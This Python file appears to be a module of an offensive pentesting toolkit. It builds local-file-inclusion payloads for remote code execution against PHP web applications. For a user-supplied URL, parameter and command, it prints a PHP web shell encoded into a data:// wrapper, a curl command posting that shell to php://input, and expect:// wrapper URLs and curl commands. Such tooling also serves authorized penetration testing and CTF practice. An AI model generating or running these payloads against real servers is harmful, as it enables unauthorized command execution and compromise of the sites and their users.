import base64
import urllib.parse

from core.target import get_current_url

PROVIDES = []
REQUIRES = []

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
BOLD = '\033[1m'


# =========================================================
# MENU
# =========================================================

def menu():

    print()

    print(
        f"{B}┌── {BOLD}LFI REMOTE CODE EXECUTION{W}{B} ─────────────┐{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────┘{W}\n"
    )

    print(f"  {B}[{C}1{B}]{W} data:// Wrapper")
    print(f"  {B}[{C}2{B}]{W} php://input Wrapper")
    print(f"  {B}[{C}3{B}]{W} expect:// Wrapper")
    print(f"  {B}[{C}4{B}]{W} Show All\n")

    return input(
        f"{Y}Select> {W}"
    ).strip() or "4"


# =========================================================
# HELPERS
# =========================================================

def print_data(url, param, cmd):

    shell = '<?php system($_GET["cmd"]); ?>'

    b64 = base64.b64encode(
        shell.encode()
    ).decode()

    encoded = urllib.parse.quote(
        b64
    )

    payload = (
        f"data://text/plain;base64,{encoded}"
    )

    print(
        f"{G}[+] data:// Wrapper{W}\n"
    )

    print(
        f"{B}PHP Shell{W}"
    )

    print(
        f"{C}{shell}{W}\n"
    )

    print(
        f"{B}Base64{W}"
    )

    print(
        f"{C}{b64}{W}\n"
    )

    print(
        f"{B}Payload{W}"
    )

    print(
        f"{C}{payload}{W}\n"
    )

    print(
        f"{B}URL{W}"
    )

    print(
        f"{C}{url}?{param}={payload}&cmd={cmd}{W}\n"
    )


def print_input(url, param, cmd):

    shell = '<?php system($_GET["cmd"]); ?>'

    curl = (
        f'curl -s -X POST '
        f'--data \'{shell}\' '
        f'"{url}?{param}=php://input&cmd={cmd}"'
    )

    print(
        f"{G}[+] php://input Wrapper{W}\n"
    )

    print(
        f"{C}{curl}{W}\n"
    )


def print_expect(url, param, cmd):

    payload = f"expect://{cmd}"

    print(
        f"{G}[+] expect:// Wrapper{W}\n"
    )

    print(
        f"{B}URL{W}"
    )

    print(
        f"{C}{url}?{param}={payload}{W}\n"
    )

    print(
        f"{B}curl{W}"
    )

    print(
        f'{C}curl -s "{url}?{param}={payload}"{W}\n'
    )


# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    ip = get_current_url(data)

    if not ip:

        print(
            f"\n{R}[!] No target selected.{W}\n"
        )

        return

    url = input(
        f"{Y}Base URL [{ip}]> {W}"
    ).strip() or ip

    param = input(
        f"{Y}LFI Parameter [language]> {W}"
    ).strip() or "language"

    cmd = input(
        f"{Y}Command [id]> {W}"
    ).strip() or "id"

    choice = menu()

    print()

    if choice == "1":

        print_data(
            url,
            param,
            cmd,
        )

    elif choice == "2":

        print_input(
            url,
            param,
            cmd,
        )

    elif choice == "3":

        print_expect(
            url,
            param,
            cmd,
        )

    else:

        print_data(
            url,
            param,
            cmd,
        )

        print_input(
            url,
            param,
            cmd,
        )

        print_expect(
            url,
            param,
            cmd,
        )

    return
